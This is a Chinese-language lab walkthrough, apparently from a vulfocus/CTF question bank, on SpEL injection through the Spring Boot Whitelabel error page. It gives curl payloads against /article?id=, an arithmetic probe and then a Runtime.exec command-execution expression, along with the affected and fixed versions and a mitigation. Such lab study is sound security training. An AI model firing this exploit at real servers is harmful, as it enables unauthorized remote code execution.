# 228｜Spring Boot Whitelabel 错误页 SpEL（无 CVE）

- 镜像：`vulfocus/spring-boot_whitelabel_spel`
- 题库端口：`9090`。公开 demo 常用 **9091**；对不上时只换映射端口，路径仍是 `/article?id=`。[S1][S5]
- 无 CVE。不是第144题 OAuth 授权页 `response_type`（CVE-2016-4977）。[S1][S3]

## 一句话打法

触发默认 Whitelabel 500 页时，错误文案里的 `${...}` 被 `ErrorMvcAutoConfiguration` 当 SpEL 求值；把表达式放进会反射到错误页的参数（本题公开环境是 `id`）。[S1][S2]

## 操作步骤

1. 对映射到 `9090` 的 HTTP 访问会报 500 的接口。公开环境：`/article?id=xxx` 或 `id=66` 出现 **Whitelabel Error Page**。[S1][S2]

   ```powershell
   curl.exe -i --globoff "http://<靶场IP>:9090/article?id=66"
   ```

2. 算术探测。PowerShell 必须单引号并加 `--globoff`，否则 `$` 被吃掉：[S1]

   ```powershell
   curl.exe -i --globoff 'http://<靶场IP>:9090/article?id=${7*7}'
   ```

   成功时错误页出现 **49**，而不是字面 `${7*7}`。[S1]

3. 换成 `Runtime.exec`。公开 payload 用 `byte[]` 避开引号（Linux 示例 `id` 对应 `0x69,0x64`）：[S1]

   ```powershell
   curl.exe -i --globoff 'http://<靶场IP>:9090/article?id=${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x69,0x64}))}'
   ```

   成功信号是命令副作用或错误页已求值；`exec` 常无命令回显。[S1][S2]

## 本题特有排坑

- 必须先有一个**会把参数反射进默认错误页**的接口；找不到 500/Whitelabel 就没有注入点。本题公开路径是 **`/article?id=`**。[S1]
- 影响 Spring Boot **1.1.0–1.1.12、1.2.0–1.2.7、1.3.0**；修到 **1.2.8 / 1.3.1**。临时可关 `server.error.whitelabel.enabled`。[S1][S3][S4]
- 这不是 Actuator `/env`、也不是 Web Flow `_` 字段或 Data REST PATCH。[S1]

## 来源

- [S1] LandGrey 清单：`/article?id=${7*7}`、版本区间。详见[来源清单](../sources/228_spring-boot-whitelabel-spel/_meta.md)。
- [S2] EXP 说明同一路径。详见[来源清单](../sources/228_spring-boot-whitelabel-spel/_meta.md)。
- [S3] Tenable：&lt; 1.2.8 与 1.3.0。详见[来源清单](../sources/228_spring-boot-whitelabel-spel/_meta.md)。
- [S4] Spring Boot 1.2.8 / 1.3.1 发布说明。详见[来源清单](../sources/228_spring-boot-whitelabel-spel/_meta.md)。
- [S5] NOSEC / Vulfocus 镜像名。详见[来源清单](../sources/228_spring-boot-whitelabel-spel/_meta.md)。
